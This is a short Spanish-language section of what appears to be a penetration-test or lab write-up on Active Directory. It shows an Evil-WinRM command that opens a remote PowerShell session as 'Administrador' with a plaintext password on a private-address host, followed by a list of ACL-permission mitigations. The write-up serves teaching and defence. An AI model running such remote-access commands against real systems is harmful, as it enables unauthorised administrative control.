## Acceso Remoto y Mitigación 

Después de validar las credenciales obtenidas durante la fase de escalada, procedí a establecer una sesión remota contra el sistema Windows objetivo.

El objetivo de esta fase es demostrar que el control obtenido sobre la cuenta comprometida permite ejecutar comandos remotamente dentro del entorno Active Directory.

## Conexión

Después de validar las credenciales obtenidas durante la fase anterior, se utilizó Evil-WinRM para autenticarse contra el servicio WinRM del equipo objetivo.

Comando utilizado:

```
evil-winrm -i '10.0.0.28'  -u 'Administrador' -p 'Raynex2026'

```

## Resultado 

*Evil-WinRM* PS C:\Users\Administrador\Documents>

## Mitigación

- Revisar y corregir permisos ACL innecesarios dentro de Active Directory.
- Eliminar permisos excesivos como:
  - GenericAll
  - GenericWrite
  - WriteDacl
  - WriteOwner
  - ForceChangePassword

